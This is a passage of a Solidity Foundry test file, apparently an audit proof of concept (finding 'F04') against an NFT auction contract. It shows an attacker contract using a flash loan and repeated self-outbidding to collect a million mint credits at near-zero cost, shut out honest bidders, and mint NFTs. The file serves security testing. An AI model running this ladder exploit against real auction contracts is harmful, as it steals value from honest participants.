        assertEq(auction.symbolCredits(address(c)), 1_000_000);
        assertEq(auction.unclaimedSymbolRanges(address(c))[0].nextId, 2);
        assertEq(auction.highestBidder(), address(c));
        assertTrue(used < TX_GAS_CAP);
        assertTrue(top < 94 ether && top > 91 ether);
        // Flash loan repaid; only the last bid is at risk; every earlier bid came back automatically.
        assertEq(address(lender).balance, 1000 ether);
        assertEq(address(c).balance, 94 ether - top);
        assertEq(address(auction).balance, top);
        assertEq(auction.refundLiability(), 0);
        // An honest single bid of the same size earns top / 0.001 ETH symbols; the ladder got 1,000,000.
        assertTrue(top / 0.001 ether < 100_000);

        // Step 4: supporters now earn nothing. The quote is 0 for any amount...
        assertEq(auction.rewardForBid(1000 ether), 0);
        uint256 next = auction.minimumBid();
        emit log_named_uint("next minimum bid (wei)", next);
        vm.deal(ALICE, next);
        // ...a bid carrying the reward quoted before the attack reverts...
        vm.expectRevert(KilimAuction.RewardSlippage.selector);
        vm.prank(ALICE);
        auction.bid{value: next}(next, next / 0.001 ether, 0);
        // ...and a bid that accepts any reward succeeds and earns zero symbols.
        vm.prank(ALICE);
        auction.bid{value: next}(next, 0, 0);
        assertEq(auction.symbolCredits(ALICE), 0);
        assertEq(auction.highestBidder(), ALICE);

        // Step 5: the attacker is outbid, gets the whole top bid back, keeps every credit.
        assertEq(address(c).balance, 94 ether);
        assertEq(auction.symbolCredits(address(c)), 1_000_000);
        vm.prank(ATTACKER);
        c.sweep();
        assertEq(ATTACKER.balance, 94 ether + 0.01 ether); // net ETH cost: zero (gas only)

        // The credits are real: they mint, lowest IDs first.
        vm.prank(ATTACKER);
        c.claim(64, ATTACKER);
        assertEq(collection.ownerOf(2), ATTACKER);
        assertEq(collection.ownerOf(65), ATTACKER);
        assertEq(collection.balanceOf(ATTACKER), 64);
        assertEq(auction.symbolCredits(address(c)), 1_000_000 - 64);
    }

    /// With small capital and no flash loan the same loop multiplies credits ~11x per ETH held.
    function testSmallCapitalLadder() public {
        vm.prank(ATTACKER);
        F04Ladder c = new F04Ladder(auction);
        vm.deal(address(c), 10 ether);

        uint256 g = gasleft();
        c.ladder(62);
        uint256 used = g - gasleft();

        uint256 top = auction.highestBid();
        uint256 credits = auction.symbolCredits(address(c));
        emit log_named_uint("bids", c.bids());
        emit log_named_uint("gas used", used);
        emit log_named_uint("top bid (wei)", top);
        emit log_named_uint("credits", credits);
        emit log_named_uint("credits an honest single bid of that size earns", top / 0.001 ether);
        emit log_named_uint("ETH refunded (wei)", c.refundsReceived());

        assertEq(c.bids(), 62);
        assertEq(address(c).balance, 10 ether - top); // only the last bid is escrowed
        assertTrue(credits > 10 * (top / 0.001 ether)); // more than 10x an honest bid
        assertTrue(used < TX_GAS_CAP);
    }
}

